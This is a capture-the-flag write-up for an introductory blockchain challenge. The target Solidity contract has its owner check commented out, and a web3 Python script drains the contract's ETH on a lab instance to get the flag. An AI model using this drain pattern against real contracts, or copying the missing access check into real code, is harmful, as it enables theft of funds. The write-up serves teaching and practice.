---
layout: post
title:  "Thanks"
date:   2025-11-16 22:58:10 -0400
author: robo.uzi
tags: [CTF]
permalink: /platypwn-thanks/
---

**Title**: Thanks

**Category**: Blockchain

**Description**: Tighten your seatbelts and get ready to embark on an exhilarating journey through the world of blockchain technology! This intro challenge will help you get started.

I get the challenge files. `Setup.sol`:
```solidity
pragma solidity ^0.8.13;  
  
import "./Chal.sol";  
  
contract Setup {  
    Chal public immutable TARGET;  
  
    constructor() payable {  
        TARGET = new Chal();  

        require(msg.value == 100 ether, "Must send 100 ether");  

        payable(address(TARGET)).transfer(100 ether);  
    }  
  
    function isSolved() public view returns (bool) {  
        return address(TARGET).balance < 10 ether;  
    }  
}
```

`Chal.sol`:
```solidity
pragma solidity ^0.8.13;  
  
contract Chal {  
    address public owner;  

    constructor() {  
        owner = msg.sender;  
    }  

    receive() external payable {}  

    function withdraw(uint256 amount) external {  
        // require(msg.sender == owner, "Not owner");  
        payable(msg.sender).transfer(amount);  
    }  
    
    function getBalance() external view returns (uint256) {  
        return address(this).balance;  
    }  
}
```
I see this line commented out: `// require(msg.sender == owner, "Not owner");`. This means anyone can withdraw any amount of ETH from the contract to themselves. I need to make a simple Solidity smart contract exploit for this private ethereum blockchain. The goal is to drain enough ETH from the Chal contract that its balance goes from 100 to at least below 10.

I started the challenge servers. The challenge spawner was at `10.80.15.206:31337` and blockchain RPC was at `10.80.15.206:8545`. I start an instance:
```shell
nc 10.80.15.206 31337  
1 - launch new instance  
2 - kill instance  
3 - get flag  
action? 1  
1  
deploying setup  
  
your private blockchain has been deployed  
it will automatically terminate in 30 minutes  
here's some useful information  
uuid:           f1c17e54-d757-44cf-9056-c48dddfb73ec  
rpc endpoint:   http://10.80.15.206:8545/f1c17e54-d757-44cf-9056-c48dddfb73ec  
private key:  0x6d3890b960c556a4a644493137f550c342a07f9ec8e202f95bcc84744a37dda6 
your address:   0x652A3a6164714A539a1b5fa23D7EeB5A355BB4be  
setup contract: 0x64976a571436F9F2d351d68841dE6536b62441e9
```

With this information I can drain the Chal contract of all ETH:
```python
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://10.80.15.206:8545/f1c17e54-d757-44cf-9056-c48dddfb73ec"))
acct = w3.eth.account.from_key("0x6d3890b960c556a4a644493137f550c342a07f9ec8e202f95bcc84744a37dda6")

setup = w3.eth.contract(
    "0x64976a571436F9F2d351d68841dE6536b62441e9",
    abi=[{"inputs":[],"name":"TARGET","outputs":[{"internalType":"contract Chal","name":"","type":"address"}],"stateMutability":"view","type":"function"},
         {"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]
)
chal = w3.eth.contract(
    setup.functions.TARGET().call(),
    abi=[{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
         {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}]
)

bal = chal.functions.getBalance().call()
tx = chal.functions.withdraw(bal).build_transaction({
    "from": acct.address, "gas":200000, "gasPrice":w3.to_wei("1","gwei"), "nonce":w3.eth.get_transaction_count(acct.address),
    "chainId": w3.eth.chain_id
})
w3.eth.send_raw_transaction(acct.sign_transaction(tx).raw_transaction)
print("Solved:", setup.functions.isSolved().call())
```

Output:
```shell
python3 solve.py  
Solved: True
```

Connect back to the server and get the flag:
```shell
nc 10.80.15.206 31337  
1 - launch new instance  
2 - kill instance  
3 - get flag  
action? 3  
3  
PP{g1v3_m3_y0ur_m0n3y::T33pBGtRgHMT}  
  
for your safety, you should delete your instance now that you are done
```

`PP{g1v3_m3_y0ur_m0n3y::T33pBGtRgHMT}`